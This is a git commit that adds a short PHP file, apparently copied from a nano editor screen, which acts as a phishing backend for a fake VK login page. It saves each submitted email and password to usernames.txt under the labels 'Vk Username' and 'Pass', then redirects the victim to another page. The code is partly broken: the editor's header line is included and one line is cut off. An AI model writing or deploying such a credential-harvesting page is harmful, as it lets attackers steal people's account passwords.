0e178b868853a7912fdc8981ad0b1216fbea0e0c
MrDanflo <83551215+MrDanflo@users.noreply.github.com>
2022-11-10 18:40:51 +0500

    Add files via upload

---
+++ login3.php
@@ -0,0 +1,6 @@
+GNU nano 6.3                           login.php
+<?php
+
+file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_PO>
+header('Location: login3.html');
+exit();
